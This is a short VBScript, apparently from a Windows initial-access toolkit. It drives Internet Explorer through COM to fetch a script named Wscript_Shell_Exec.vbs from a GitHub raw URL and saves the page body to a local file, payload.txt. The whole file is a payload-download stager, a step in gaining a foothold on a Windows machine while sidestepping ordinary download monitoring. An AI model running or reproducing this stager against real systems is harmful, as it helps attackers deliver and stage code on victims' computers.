Set ie = CreateObject("InternetExplorer.Application")
ie.Navigate "https://raw.githubusercontent.com/hegusung/Windows-Initial-Access/main/VBS/Wscript_Shell_Exec.vbs"
State = 0
Do Until State = 4
WScript.Sleep 1000
State = ie.readyState
Loop

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile(".\payload.txt", True)
objFile.Write ie.Document.Body.innerHTML
objFile.Close